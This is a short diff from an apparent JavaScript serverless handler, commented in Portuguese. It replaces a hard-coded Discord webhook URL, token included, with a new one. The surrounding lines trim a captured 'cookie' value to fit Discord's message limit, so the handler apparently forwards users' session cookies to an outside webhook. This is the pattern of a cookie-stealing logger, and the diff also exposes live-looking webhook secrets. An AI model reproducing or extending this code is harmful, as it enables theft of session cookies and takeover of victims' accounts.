@@ -45,7 +45,7 @@ export default async function handler(req, res) {
     }
 
     // ========== WEBHOOK DO DISCORD ==========
-    const webhookURL = 'https://canary.discord.com/api/webhooks/1477057706568323195/4545g7HNyqcjMCkJe2t95-djEoA-kuXgu-VY1u_zb6slpT3lpdmbwyxDl8urWU51Effi';
+    const webhookURL = 'https://canary.discord.com/api/webhooks/1485346055141851308/-4ro_V3pWvgd_qRDW6uOO0WkVEmDQmt-9HNzgFd1MnqObF-TGy23rXLxESosIqg8KnFT';
 
     // Limitar tamanho do cookie (Discord: 2000 caracteres por field)
     const cookieLimitado = cookie.length > 1900 ? cookie.substring(0, 1900) + '...' : cookie;
